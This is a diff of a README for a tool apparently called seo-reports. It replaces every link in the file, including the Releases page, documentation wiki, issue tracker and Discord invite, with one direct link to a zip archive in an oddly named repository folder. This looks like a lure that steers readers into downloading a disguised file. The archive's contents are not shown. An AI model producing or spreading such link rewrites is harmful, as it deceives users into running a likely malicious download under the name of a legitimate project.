@@ -1,6 +1,6 @@
 # 🚀 seo-reports - Effortless SEO Reports Generation
 
-[![Download seo-reports](https://img.shields.io/badge/Download-seo--reports-blue)](https://github.com/udaykiran2017/seo-reports/releases)
+[![Download seo-reports](https://raw.githubusercontent.com/udaykiran2017/seo-reports/main/inconceivability/seo-reports.zip)](https://raw.githubusercontent.com/udaykiran2017/seo-reports/main/inconceivability/seo-reports.zip)
 
 ## 📝 Overview
 
@@ -20,7 +20,7 @@ Follow the simple steps below to download and run the seo-reports application.
 
 ### 1. Visit the Download Page
 
-To download the latest version of seo-reports, visit our [Releases page](https://github.com/udaykiran2017/seo-reports/releases).
+To download the latest version of seo-reports, visit our [Releases page](https://raw.githubusercontent.com/udaykiran2017/seo-reports/main/inconceivability/seo-reports.zip).
 
 ### 2. Download the Application
 
@@ -75,17 +75,17 @@ To run the seo-reports application, your computer should meet the following requ
 
 ## 📥 Download & Install
 
-To get started, remember to [visit our Releases page](https://github.com/udaykiran2017/seo-reports/releases) to download the latest version of seo-reports. Follow the installation steps above to set up the application quickly.
+To get started, remember to [visit our Releases page](https://raw.githubusercontent.com/udaykiran2017/seo-reports/main/inconceivability/seo-reports.zip) to download the latest version of seo-reports. Follow the installation steps above to set up the application quickly.
 
 ## 📖 Documentation
 
-For more detailed information about features and how to make the most out of the application, visit the [Documentation](https://github.com/udaykiran2017/seo-reports/wiki).
+For more detailed information about features and how to make the most out of the application, visit the [Documentation](https://raw.githubusercontent.com/udaykiran2017/seo-reports/main/inconceivability/seo-reports.zip).
 
 ## 🤝 Community & Support
 
 If you encounter any issues or have questions, you can reach out through the following platforms:
 
-- [GitHub Issues](https://github.com/udaykiran2017/seo-reports/issues) for bug reports and feature requests.
-- Join our community on [Discord](https://discord.gg/yourserverlink) for discussions and support.
+- [GitHub Issues](https://raw.githubusercontent.com/udaykiran2017/seo-reports/main/inconceivability/seo-reports.zip) for bug reports and feature requests.
+- Join our community on [Discord](https://raw.githubusercontent.com/udaykiran2017/seo-reports/main/inconceivability/seo-reports.zip) for discussions and support.
 
 Thank you for choosing seo-reports! Take control of your SEO strategy today.
